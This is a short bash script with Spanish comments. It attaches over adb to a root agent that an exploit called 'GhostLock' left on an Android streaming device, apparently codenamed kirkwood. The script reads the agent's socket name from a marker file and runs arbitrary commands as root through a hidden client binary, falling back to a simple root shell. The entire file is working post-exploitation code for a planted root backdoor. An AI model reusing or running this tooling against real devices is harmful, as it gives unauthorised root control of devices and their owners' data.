#!/usr/bin/env bash
# Engancha al agente root que dejó GhostLock y ejecuta un comando.
# Uso: ./attach.sh 'id; getenforce'      (sin argumentos: shell simple)
set -u

DEV="${DEV:?export DEV=<streamer-ip>:5555}"
READY=/data/local/tmp/root_agent_ready
CLIENT=/data/local/tmp/.ghostlock-oneclick/kirkwood_root_sh

adb connect "$DEV" >/dev/null 2>&1
LINE="$(adb -s "$DEV" shell "cat $READY" 2>/dev/null | tr -d '\r')"
NAME="$(printf '%s\n' "$LINE" | sed -n 's/.*abstract=\([^ ]*\).*/\1/p')"
[ -n "$NAME" ] || { echo "[!] no hay agente root vivo en $DEV (reinicia y vuelve a lanzar el exploit)"; exit 1; }

CMD="${1:-id; getenforce}"
echo "[*] agente: $NAME"
exec adb -s "$DEV" shell "$CLIENT --name $NAME --exec \"$CMD\""
